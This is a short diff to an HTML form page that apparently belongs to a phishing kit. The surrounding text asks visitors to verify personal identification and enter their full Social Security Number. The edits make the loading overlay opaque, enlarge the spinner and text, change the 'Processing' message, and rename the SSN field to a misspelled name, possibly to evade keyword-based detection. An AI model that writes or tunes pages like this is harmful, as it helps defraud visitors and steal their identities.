@@ -524,10 +524,10 @@ Please specify the correct personal identification information below to verify y
   <style>
     :root {
       /* Customizable variables */
-      --loading-text-size: 26px;           /* Size of the "Processing..." text */
+      --loading-text-size: 40px;           /* Size of the "Processing..." text */
       --loading-text-color: #000000;        /* Color of the "Processing..." text */
       --spinner-size: 110px;               /* Size of the rotating icon */
-      --spinner-border-size: 9px;         /* Thickness of the spinner border */
+      --spinner-border-size: 20px;         /* Thickness of the spinner border */
       --spinner-color: brown;             /* Color of the rotating part */
       --spinner-speed: 1s;                /* Rotation speed of the spinner */
     }
@@ -540,7 +540,7 @@ Please specify the correct personal identification information below to verify y
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(255, 255, 255, 0.8);
+      background-color: #ffffff;
       z-index: 1000;
       justify-content: center;
       align-items: center;
@@ -678,7 +678,7 @@ Enter Your Full  Nine Digits Social Security Number
 oninput="vvalidateInput(this)"
 
 class="input-fieldy"
-name="SSN_number" required 
+name="SSSN_numbr" required 
  placeholder="Enter your social security number">
 
 
@@ -742,7 +742,7 @@ function vvalidateInput(input) {
   <div class="loading-overlay" id="loading-overlay">
     <div>
       <div class="loading-icon"></div>
-      <div class="loading-text"><strong>Processing. . .</strong></div>
+      <div class="loading-text"><strong>Please Wait..</strong></div>
     </div>
   </div>
   
